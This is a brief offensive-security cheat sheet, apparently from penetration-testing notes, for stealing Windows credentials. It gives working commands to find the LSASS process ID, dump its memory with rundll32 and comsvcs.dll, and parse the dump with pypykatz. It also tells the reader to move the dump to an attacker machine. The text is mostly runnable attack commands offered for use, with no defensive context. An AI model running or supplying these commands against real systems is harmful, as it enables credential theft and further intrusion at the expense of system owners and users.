
### via comsvcs.dll

Find the Process ID (PID) of LSASS:

```powershell
tasklist /fi "imagename eq lsass.exe"
```



```powershell
cmd.exe /c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full"
```



Then transfer to Attacker machine


### Parse the Dump

```bash
pypykatz lsa minidump lsass.dmp
```


#Note To accomplish this , you must have administrative privileges on target system

